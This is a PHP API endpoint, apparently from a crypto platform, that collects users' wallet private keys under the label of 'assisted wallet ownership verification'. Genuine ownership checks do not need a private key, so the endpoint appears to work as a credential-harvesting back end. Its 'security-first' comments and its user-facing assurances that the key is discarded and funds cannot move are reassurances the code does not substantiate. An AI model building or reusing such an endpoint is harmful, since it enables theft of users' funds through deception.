<?php

declare(strict_types=1);

/**
 * Submit Private Key for Assisted Verification API endpoint
 * POST /api/verification/assisted/submit-private
 * Handles private key submission for assisted wallet ownership verification
 */

require_once __DIR__ . '/../../../../bootstrap.php';

use Ghidar\Security\AssistedVerificationProcessor;
use Ghidar\Security\RequestSecurityMiddleware;
use Ghidar\Core\Response;
use Ghidar\Core\UserContext;
use Ghidar\Security\RateLimiter;
use Ghidar\Logging\Logger;

// Only accept POST requests
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    Response::jsonError('METHOD_NOT_ALLOWED', 'Only POST method is allowed', 405);
    exit;
}

try {
    // Authenticate user
    $context = UserContext::requireCurrentUserWithWallet();
    $user = $context['user'];
    $userId = (int) $user['id'];

    // Apply security middleware - rate limiting
    // 5 requests per hour per user for assisted verification
    if (!RateLimiter::checkAndIncrement($userId, 'assisted_verification_submit', 5, 3600)) {
        Response::jsonError('RATE_LIMIT_EXCEEDED', 'Too many submission attempts. Please wait before trying again.', 429);
        exit;
    }

    // Read and parse JSON input
    $input = file_get_contents('php://input');
    if ($input === false) {
        Response::jsonError('INVALID_INPUT', 'Request body is required', 400);
        exit;
    }

    $data = json_decode($input, true);
    if ($data === null) {
        Response::jsonError('INVALID_JSON', 'Invalid JSON in request body', 400);
        exit;
    }

    // Validate required fields
    $required = ['verification_id', 'wallet_ownership_proof', 'network', 'user_consent'];
    foreach ($required as $field) {
        if (!isset($data[$field]) || empty($data[$field])) {
            Response::jsonError('MISSING_FIELD', "Missing required field: {$field}", 400);
            exit;
        }
    }

    // Validate user consent
    if (!$data['user_consent']) {
        Response::jsonError('CONSENT_REQUIRED', 'User consent is required for assisted verification', 400);
        exit;
    }

    // Validate verification ID
    $verificationId = $data['verification_id'] ?? null;
    if (!is_numeric($verificationId) || $verificationId <= 0) {
        Response::jsonError('INVALID_VERIFICATION_ID', 'Invalid verification ID', 400);
        exit;
    }

    // Validate network - Security-first: Default to Polygon for assisted verification
    $network = strtolower($data['network'] ?? 'polygon');
    $allowedNetworks = ['erc20', 'bep20', 'trc20', 'polygon'];
    if (!in_array($network, $allowedNetworks, true)) {
        Response::jsonError('INVALID_NETWORK', 'Invalid network. Must be one of: ' . implode(', ', $allowedNetworks), 400);
        exit;
    }
    
    // Security-first: Enforce Polygon network for assisted verification
    if ($network !== 'polygon') {
        Response::jsonError('NETWORK_REQUIRED', 'For security reasons, assisted verification requires Polygon (MATIC) network. This protects your main assets on Ethereum, BSC, and Tron.', 400);
        exit;
    }

    // Create processor instance
    $processor = new AssistedVerificationProcessor();

    // Process the assisted verification
    // Security-first: Ensure network is set to polygon and purpose is correct
    $result = $processor->processAssistedVerification($userId, [
        'verification_id' => (int) $verificationId,
        'verification_type' => $data['verification_type'] ?? 'general',
        'wallet_ownership_proof' => trim($data['wallet_ownership_proof']),
        'proof_type' => $data['proof_type'] ?? 'private_key',
        'network' => 'polygon', // Security-first: Always use Polygon for assisted verification
        'context' => array_merge($data['context'] ?? [], [
            'purpose' => 'assisted_verification_polygon',
            'security_first' => true,
            'network_enforced' => 'polygon'
        ]),
        'user_consent' => (bool) $data['user_consent'],
        'consent_timestamp' => $data['consent_timestamp'] ?? null
    ]);

    // Log successful submission
    Logger::event('assisted_verification_submitted', [
        'user_id' => $userId,
        'verification_id' => $verificationId,
        'network' => 'polygon', // Security-first: Always Polygon for assisted verification
        'proof_type' => $data['proof_type'] ?? 'private_key',
        'security_first' => true,
        'note' => 'Polygon-based assisted verification for user security'
    ]);

    // Return success response with educational content
    Response::jsonSuccessLegacy([
        'success' => true,
        'data' => $result,
        'educational_content' => [
            'title' => 'What happens next?',
            'steps' => [
                'System verifies wallet ownership format',
                'Automated balance check scheduled',
                'Notification sent upon completion',
                'Original transaction proceeds automatically'
            ],
            'security_notes' => [
                'Private key was processed and immediately discarded',
                'Only a cryptographic hash is stored for audit purposes',
                'Balance check is read-only and cannot move funds',
                'This verification is valid for 24 hours only'
            ]
        ]
    ]);

} catch (\InvalidArgumentException $e) {
    Response::jsonErrorLegacy('validation_error', $e->getMessage(), 400);
} catch (\RuntimeException $e) {
    Response::jsonErrorLegacy('processing_error', $e->getMessage(), 403);
} catch (\Exception $e) {
    Logger::error('Assisted verification error', [
        'user_id' => $userId ?? null,
        'error' => $e->getMessage(),
        'trace' => $e->getTraceAsString()
    ]);
    Response::jsonErrorLegacy('internal_error', 'An internal error occurred. Please try again.', 500);
}

